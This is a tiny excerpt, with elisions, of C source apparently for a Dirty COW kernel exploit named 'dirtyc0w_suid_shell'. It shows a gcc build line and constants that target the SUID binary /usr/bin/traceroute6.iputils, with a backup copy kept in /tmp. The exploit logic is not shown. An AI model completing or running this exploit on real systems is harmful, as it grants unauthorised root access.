...
//
// Compile with:
//   gcc -pthread dirtyc0w_suid_shell.c -o dirtyc0w_suid_shell -lcrypt
//
...
const char *filename = "/usr/bin/traceroute6.iputils";
const char *backup_filename = "/tmp/traceroute6.iputils.bak";
